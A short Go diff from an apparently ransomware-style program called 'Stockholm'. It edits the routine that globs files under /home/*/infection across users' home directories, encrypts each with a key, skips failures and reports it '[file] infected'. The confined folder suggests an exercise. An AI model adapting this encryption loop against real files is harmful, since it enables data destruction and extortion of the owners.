@@ -84,7 +84,7 @@ func parser(argList []string) (*StockholmOptions, error) {
 
 // Retrieve the content of the infection dir
 func getInfectionFiles(reverse bool) ([]string, error) {
-	pattern := "/home/*/infection"
+	pattern := "/home/*/infection/*"
 	if reverse {
 		pattern = "/home/*/infection/*.ft"
 	}
@@ -119,9 +119,10 @@ func runInfection(opts *StockholmOptions) {
 		ErrorExit(err)
 	}
 	for _, file := range(files) {
-		err = crypt.EncryptFile(opts.key, file, file + ".ft")
+		err = crypt.EncryptFile(opts.key, file)
 		if err != nil {
 			fmt.Println(err)
+			continue
 		}
 		if !opts.silent {
 			fmt.Printf("[%s] infected\n", file)
